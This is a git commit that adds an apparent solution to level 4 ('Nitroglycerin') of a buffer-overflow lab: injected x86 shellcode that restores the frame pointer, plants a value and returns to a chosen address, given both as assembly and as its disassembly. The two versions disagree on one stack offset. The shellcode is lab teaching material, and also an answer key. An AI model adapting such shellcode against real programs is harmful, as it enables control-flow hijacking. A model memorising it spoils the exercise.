c8eceb9d56440f1c1adb10c8dac70e0b9e993858
chenjinxian <alanchen1203@gmail.com>
2015-07-07 21:51:11 +0800

    add solution for level 4: Nitroglycerin

---
+++ buflab/nitro.d
@@ -0,0 +1,12 @@
+
+nitro.o:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+00000000 <.text>:
+   0:	a1 08 d1 04 08       	mov    0x804d108,%eax
+   5:	8d 6c 24 28          	lea    0x24(%esp),%ebp
+   9:	89 85 f8 fd ff ff    	mov    %eax,-0x208(%ebp)
+   f:	68 3a 8e 04 08       	push   $0x8048e3a
+  14:	c3                   	ret    
---
+++ buflab/nitro.s
@@ -0,0 +1,5 @@
+mov     0x0804d108,%eax
+lea     0x28(%esp),%ebp
+mov     %eax,-0x208(%ebp)
+push    $0x08048e3a
+ret
